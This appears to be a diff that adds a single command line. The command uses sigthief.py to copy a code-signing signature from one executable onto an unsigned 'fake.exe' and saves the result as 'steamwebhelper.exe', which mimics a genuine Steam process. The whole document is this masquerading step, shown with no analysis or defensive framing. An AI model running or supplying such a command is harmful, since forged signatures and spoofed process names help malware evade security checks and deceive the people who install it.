@@ -1,0 +1,1 @@
+py sigthief.py -i original.exe -t fake.exe -o steamwebhelper.exe
